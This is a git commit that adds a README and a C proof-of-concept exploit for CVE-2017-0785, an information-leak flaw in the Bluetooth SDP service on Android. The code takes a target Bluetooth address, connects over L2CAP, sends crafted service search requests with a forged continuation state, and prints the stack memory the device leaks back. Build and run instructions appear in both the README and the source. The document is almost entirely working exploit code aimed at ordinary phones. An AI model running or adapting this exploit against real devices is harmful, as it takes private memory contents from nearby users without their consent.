marsyy__littl_tools
commit e1e0d4e4949c2ebfe322cfc8f3a501cde99ee953
Author:     daiyang <406555789@qq.com>
AuthorDate: Mon Sep 25 04:57:08 2017 -0400
Commit:     daiyang <406555789@qq.com>
CommitDate: Mon Sep 25 04:57:08 2017 -0400

    Develop | Add poc for CVE-2017-0785
    
    Signed-off-by: daiyang <406555789@qq.com>

diff --git a/bluetooth/CVE-2017-0785/README b/bluetooth/CVE-2017-0785/README
new file mode 100644
index 0000000..46824c9
--- /dev/null
+++ b/bluetooth/CVE-2017-0785/README
@@ -0,0 +1,6 @@
+emote leak stack data from android devices with bluetooth open
+
+***Only for android devices***
+usage:
+$ gcc -o test poc_remote_info_leak_android.c -lbluetooth
+$ sudo ./test TARGET_ADDR LEAK_COUNT
diff --git a/bluetooth/CVE-2017-0785/poc_remote_info_leak_android.c b/bluetooth/CVE-2017-0785/poc_remote_info_leak_android.c
new file mode 100644
index 0000000..bb9c988
--- /dev/null
+++ b/bluetooth/CVE-2017-0785/poc_remote_info_leak_android.c
@@ -0,0 +1,311 @@
+//copyright @
+//huahuaisadog@gmail.com
+
+/***
+***Only for android devices***
+usage:
+$ gcc -o test poc_remote_info_leak_android.c -lbluetooth
+$ sudo ./test TARGET_ADDR LEAK_COUNT
+***/
+
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>          
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <bluetooth/bluetooth.h>
+#include <bluetooth/l2cap.h>
+
+#define __u8 unsigned char
+#define __le16 unsigned short
+#define __le32 unsigned int
+#define __u16 unsigned short
+struct l2cap_cmd_hdr {
+	__u8       code;
+	__u8       ident;
+	__le16     len;
+};
+struct l2cap_conn_req {
+	__le16     psm;
+	__le16     scid;
+};
+
+struct l2cap_conf_req {
+	__le16     dcid;
+	__le16     flags;
+	__u8       data[0];
+};
+
+struct l2cap_conf_rsp {
+	__le16     scid;
+	__le16     flags;
+	__le16     result;
+};
+
+struct l2cap_conf_opt {
+	__u8 type;
+	__u8 len;
+};
+
+struct fack_opt{
+	__u8 type;
+	__u8 len;
+	__le16 val;
+};
+
+struct l2cap_conf_efs {
+	__u8 id;
+	__u8 stype;
+	__le16 msdu;
+	__le32 sdu_itime;
+	__le32 acc_lat;
+	__le32 flush_to;
+};
+
+typedef struct sdp_pdu_hdr{
+	uint8_t  pdu_id;
+	uint16_t tid;
+	uint16_t plen;
+} __attribute__ ((packed)) sdp_pdu_hdr_t;
+
+typedef struct {
+	uint32_t timestamp;
+	union {
+		uint16_t maxBytesSent;
+		uint16_t lastIndexSent;
+	} cStateValue;
+} sdp_cont_state_t;
+
+static void *leak_data;
+static int leak_count = 0;
+
+#define HEAD_LEN (sizeof(struct l2cap_cmd_hdr))
+static int parse_conn_req(void *buffer, __u8 ident, __le16 len, void *data) {
+	struct l2cap_cmd_hdr head;
+	head.code = L2CAP_CONN_REQ;
+	head.ident = ident;
+	head.len = len;
+	memcpy(buffer, &head, sizeof(head));
+	memcpy(buffer + sizeof(head), data, len);
+}
+
+
+#define SDP_SVC_SEARCH_ATTR_REQ 0x6
+static int parse_sdp_search_attr_req(void *buffer, __le16 data_len, void *data){
+	sdp_pdu_hdr_t pdu_head;
+	__le16 tmp;
+	
+	memset(&pdu_head, 0, sizeof(pdu_head));
+	pdu_head.pdu_id = SDP_SVC_SEARCH_ATTR_REQ;
+	pdu_head.tid = 0;
+	tmp = ((data_len & 0xff) << 8 ) + ((data_len >> 8) & 0xff);
+	pdu_head.plen = tmp;
+	memcpy(buffer, &pdu_head, sizeof(pdu_head));
+	memcpy(buffer + sizeof(pdu_head), data, data_len);
+	return data_len + sizeof(pdu_head);
+}
+
+#define  SDP_PDU_SERVICE_SEARCH_REQ             0x02
+static int parse_sdp_service_search_req(void *buffer, __le16 data_len, void *data){
+	sdp_pdu_hdr_t pdu_head;
+	__le16 tmp;
+	
+	memset(&pdu_head, 0, sizeof(pdu_head));
+	pdu_head.pdu_id = SDP_PDU_SERVICE_SEARCH_REQ;
+	pdu_head.tid = 0;
+	tmp = ((data_len & 0xff) << 8 ) + ((data_len >> 8) & 0xff);
+	pdu_head.plen = tmp;
+
+	memcpy(buffer, &pdu_head, sizeof(pdu_head));
+	memcpy(buffer + sizeof(pdu_head), data, data_len);
+	return data_len + sizeof(pdu_head);
+}
+
+
+static int l2cap_set_mtu(int sock_fd, __le16 imtu, __le32 omtu) {
+	int ret;
+	struct l2cap_options option_arg;
+	socklen_t len ;
+	memset(&option_arg, 0 ,sizeof(option_arg));
+
+	ret = getsockopt(sock_fd, SOL_L2CAP, L2CAP_OPTIONS, &option_arg, &len);
+	if(ret == -1){
+		perror("[-]getsockopt failed : ");
+		return -1;
+	}
+
+	option_arg.imtu = imtu;
+	option_arg.omtu = omtu;
+
+	ret = setsockopt(sock_fd, SOL_L2CAP, L2CAP_OPTIONS, &option_arg, sizeof(option_arg));
+	if(ret == -1){
+		perror("[-]setsockopt failed : ");
+		return -1;
+	}
+	return 0;
+}
+
+static int send_first_req(int sock_fd){
+	void *buf;
+	char data[] = 	"\x35\x03\x19\x01\x00" // L2CAP PATTERN
+					"\x00\x10"  //max reply
+					"\x00";  // CONTINUATION STATE
+	int total_len;
+
+	buf = malloc(0x100);
+	memset(buf, 0, 0x100);
+	total_len = parse_sdp_service_search_req(buf, sizeof(data) - 1, data);
+	send(sock_fd, buf, total_len, 0);
+	free(buf);
+}
+
+
+static void append_leak_data(void *recv_buf, int recv_size) {
+	if(recv_size < 0x15)
+		return;
+	memcpy(leak_data + leak_count, recv_buf + 0x12, recv_size - 0x12 - 0x3);
+	leak_count += recv_size - 0x12 - 0x3;
+}
+
+static __le16 get_cont_offset(int sock_fd, int flag) {
+	void *recv_buf;
+	__le16 cont_offset;
+	int ret;
+
+	recv_buf = malloc(0x1000);
+	ret = recv(sock_fd, recv_buf, 0x1000, 0);
+	if(ret == -1) {
+		perror("[-] recv cont_offset : ");
+		return -1;
+	}
+
+	memcpy(&cont_offset, recv_buf + ret - 2, 2);
+
+	if(flag == 1)
+		append_leak_data(recv_buf, ret);
+
+	free(recv_buf);
+	return cont_offset;
+
+}
+
+static int send_leak_req(int sock_fd, __le16 cont_offset) { 
+	void *buf;
+	char data_head[] = "\x35\x03\x19\x01\x00" // L2CAP PATTERN
+				  "\x00\x00"  //max reply
+				  "\x02";  // CONTINUATION STATE
+	char data[40] = {'\0'};
+	int data_len = sizeof(data_head) - 1 + sizeof(cont_offset);
+	int total_len;
+
+	buf = malloc(0x100);
+	memset(buf, 0, 0x100);
+	memcpy(data, data_head, sizeof(data_head) - 1);
+	memcpy(data + sizeof(data_head) - 1, &cont_offset, sizeof(cont_offset));
+
+	total_len = parse_sdp_service_search_req(buf, data_len, data);
+	send(sock_fd, buf, total_len, 0);
+
+	free(buf);
+
+	return 0;
+}
+
+static void show_leak_data(){
+	int i;
+	unsigned int *p = (unsigned int *)leak_data;
+	for(i = 0; i < leak_count/sizeof(unsigned int) ; i++) {
+		if(i % 4 == 0)
+			printf("%08x : ", i/4 * 0x10);
+		printf("%08x " ,p[i]);
+		if(i % 4 == 3)
+			printf("\n");
+	}
+}
+
+int main(int argc ,char* argv[]){
+	int sock_fd, ret;
+	int i;
+	__le16 cont_offset;
+	void *buf, *data, *recv_buf;
+	int leak_req_count;
+	char dest[18];
+	struct sockaddr_l2 local_l2_addr;
+	struct sockaddr_l2 remote_l2_addr;
+
+	if(argc != 3){
+		printf("usage : sudo ./test TARGET_ADDR LEAK_COUNT\n");
+		return -1;
+	}
+	strncpy(dest, argv[1], 18);
+	leak_req_count = strtol(argv[2], NULL, 16);
+	//char dest[18] = "48:db:50:02:c6:71";  //aosp angler
+	//char dest[18] = "dc:a9:04:86:45:cc";   // macbookpro
+	//char dest[18] = "00:1A:7D:DA:71:14"; //linux
+	// = "00:1a:7d:da:71:13"; //panyu
+	
+
+	sock_fd = socket(PF_BLUETOOTH, SOCK_STREAM, BTPROTO_L2CAP);
+	if(sock_fd == -1){
+		perror("[-]socket create failed : ");
+		return -1;
+	}
+
+	memset(&local_l2_addr, 0, sizeof(struct sockaddr_l2));
+	local_l2_addr.l2_family = PF_BLUETOOTH;
+	memcpy(&local_l2_addr.l2_bdaddr , BDADDR_ANY, sizeof(bdaddr_t));
+
+
+	ret = bind(sock_fd, (struct sockaddr*) &local_l2_addr, sizeof(struct sockaddr_l2));
+	if(ret == -1){
+		perror("[-]bind()");
+		goto out;
+	}
+
+
+	l2cap_set_mtu(sock_fd, 48, 48);
+
+	memset(&remote_l2_addr, 0, sizeof(remote_l2_addr));
+	remote_l2_addr.l2_family = PF_BLUETOOTH;
+	remote_l2_addr.l2_psm = htobs(0x1);
+	str2ba(dest, &remote_l2_addr.l2_bdaddr);
+
+	if(connect(sock_fd, (struct sockaddr *) &remote_l2_addr,sizeof(remote_l2_addr)) < 0) {  
+  		perror("[-]Can't connect");  
+		goto out;  
+	} 
+
+	sleep(2);
+
+	leak_data = malloc(leak_req_count + 0x100);
+	if(leak_data == NULL){
+		perror("[-] malloc");
+		goto out;
+	}
+
+	send_first_req(sock_fd);
+
+	cont_offset = get_cont_offset(sock_fd, 0);
+
+	while(leak_count < leak_req_count){
+		send_leak_req(sock_fd, cont_offset);
+		cont_offset = get_cont_offset(sock_fd, 1);
+		if(cont_offset == -1){
+			printf("[-]leak_failed\n");
+			goto clean;
+		}
+	}
+
+	show_leak_data();
+
+	printf("\n[+]test done\n");
+
+clean:
+	free(leak_data);
+out:
+	close(sock_fd);
+	return 0; 
+}
\ No newline at end of file
